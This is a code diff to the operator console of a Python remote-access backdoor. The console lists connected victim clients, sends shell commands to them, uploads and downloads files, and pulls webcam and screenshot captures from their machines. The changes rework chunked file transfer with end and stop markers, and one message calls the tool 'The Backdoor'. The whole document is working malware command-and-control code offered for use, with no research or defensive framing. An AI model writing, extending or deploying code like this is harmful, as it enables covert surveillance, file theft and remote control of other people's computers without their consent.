@@ -57,6 +57,23 @@ def handle_client():
 thread = threading.Thread(target=handle_client, daemon=True)
 thread.start()
 
+def recv_file(conn, filename, failmsg):
+    buffer = b""
+    while True:
+        data = conn.recv(8192)
+        if not data: 
+            break
+        if b"$$STOP$$" in data:
+            Write.Print(failmsg, Colors.red, interval=0.0125)
+            return
+        if b"$$END$$" in data:
+            buffer += data.replace(b"$$END$$", b"")
+            with open(filename, "wb") as f: 
+                f.write(buffer)
+            Write.Print(f"  [>] {filename} received successfully.", Colors.green, interval=0.0125)
+            return
+        buffer += data
+
 def ChooseClient():
     System.Clear()
     print("\n"*2)
@@ -85,7 +102,7 @@ def ChooseClient():
 def Idlist():
     Write.Print(f"\n  [>] List of ID :\n", Colors.green_to_cyan, interval=0.0125)
     for clientID, addrtemp in listID.items():
-        Write.Print(f"  [>] This {clientID} is connected to {addrtemp[1]}", Colors.green_to_cyan, interval=0.0125) # changer la phrase la et le write marche pas avec les valeur enin tkt je vaidss trouvezr juste change la phgrazse et ca devrait etre bon
+        Write.Print(f"  [>] This Client : {clientID} is connected to {addrtemp[1]} \n", Colors.green_to_cyan, interval=0.0125) # changer la phrase la et le write marche pas avec les valeur enin tkt je vaidss trouvezr juste change la phgrazse et ca devrait etre bon
     print("")
 
 ChooseClient()
@@ -100,7 +117,7 @@ print("\n"*2)
 
 while True:
     Write.Print(f"\n\n  [>] Type Help for a list of available commands.", Colors.green_to_cyan, interval=0.0125)
-    command = Write.Input(f"\n  [>] {addr} CMD : ", Colors.green_to_cyan, interval=0.0125) # change phrase surement
+    command = Write.Input(f"\n  [>] {addr} CMD : ", Colors.green_to_cyan, interval=0.0125) 
 
     if command.lower() == "change":
         ChooseClient()
@@ -116,22 +133,37 @@ while True:
         Idlist()
         continue
     elif command.lower() == "help":
-        Write.Print(listCommand, Colors.green_to_cyan, interval=0)
+        print(f"\n {listCommand}")
         continue
     elif command.lower() == "quit":
         sys.exit(0)
 
     elif command[:6].lower() == "upload":
-        if os.path.exists(command[7:]):
-            conn.send(command.encode())
-            with open(command[7:], "rb") as f:
-                conn.sendall(f.read())
-            Write.Print(conn.recv(1024).decode(), Colors.green, interval=0.0125)
-            continue
-        else:
-            Write.Print("  [>] This file doesn't exist", Colors.red, interval=0.0125)
+        filepath = command[7:].strip()
+
+        if not os.path.isfile(filepath):
+            Write.Print("  [>] This file doesn't exist.\n", Colors.red, interval=0.0125)
             continue
 
+        try:
+            conn.send(command.encode())
+            sleep(0.5)
+
+            with open(filepath, "rb") as f:
+                while True:
+                    chunk = f.read(8192)
+                    if not chunk:
+                        break
+                    conn.sendall(chunk)
+
+            conn.send(b"$$END$$")
+
+            Write.Print("  [>] Upload terminé.", Colors.green, interval=0.0125)
+            continue
+
+        except Exception as e:
+            Write.Print(f"  [>] Upload failed: {str(e)}", Colors.red, interval=0.0125)
+            continue
 
     try:
         conn.send(command.encode())
@@ -141,67 +173,29 @@ while True:
         ChooseClient()
         continue
 
-    if command[:8].lower() == "download":
-        with open(command[9:], "wb") as f:
-            conn.settimeout(2)
-            try:
-                while True:
-                    data = conn.recv(1024)
-                    if data == b"$$STOP$$":
-                        Write.Print("  [>] This file doesn't exist.", Colors.red, interval=0.0125)
-                        f.close()
-                        os.remove(command[9:])
-                        break            
-                    f.write(data)
-            except socket.timeout:
-                client.settimeout(None)
-                Write.Print("  [>] Download has ended.", Colors.green, interval=0.0125)
-
-    elif command[:3].lower() == "cam":
-        conn.settimeout(10)
-        with open("captureCam.png", "wb") as f:
-            try:
-                while True:
-                    data = conn.recv(1024)
-                    if data.decode() == "$$STOP$$":
-                        Write.Print("  [>] This camera doesn't exist.", Colors.red, interval=0.0125)
-                        os.remove("captureCam.png")
-                        break
-                    f.write(data)
-            except socket.timeout:
-                Write.Print("  [>] Download cam has ended.", Colors.green, interval=0.0125)
-            finally:
-                conn.settimeout(None)
-
+    if command[:3].lower() == "cam":
+        recv_file(conn, "captureCam.png", "  [>] This camera doesn't exist or failed to capture.")
 
     elif command[:6].lower() == "screen":
-        conn.settimeout(2)
-        with open("captureScreen.png", "wb") as f:
-            try:
-                while True:
-                    data = conn.recv(1024)
-                    try:
-                        if data.decode() == "$$STOP$$":
-                            Write.Print("  [>] This screen doesn't exist.", Colors.red, interval=0.0125)
-                            os.remove("captureScreen.png")
-                            break
-                    except:
-                        f.write(data)
-            except socket.timeout:
-                Write.Print("  [>] Download screen has ended.", Colors.green, interval=0.0125)
-            finally:
-                conn.settimeout(None)
+        recv_file(conn, "captureScreen.png", "  [>] This screen doesn't exist or failed to capture.")
+
+    elif command[:8].lower() == "download":
+        recv_file(conn, command[9:].strip(), "  [>] This file doesn't exist.")
+
+
 
     else:
-        conn.settimeout(2)
+        buffer = ""
         try:
             while True:
-                data = conn.recv(1024)
-                Write.Print(data.decode(), Colors.green_to_cyan, interval=0)
-        except socket.timeout:
-            conn.settimeout(None)
+                data = conn.recv(1024).decode()
+                if "$$END$$" in data:
+                    buffer += data.replace("$$END$$", "")
+                    break
+                buffer += data
+            print(buffer)
         except ConnectionResetError:
             Write.Print("  [>] The Backdoor has been closed", Colors.red, interval=0.0125)
             break
-        except:
-            Write.Print("  [>] This command does not exist.", Colors.red, interval=0.0125)
+        except Exception:
+            Write.Print("  [>] This command does not exist or returned an error.", Colors.red, interval=0.0125)
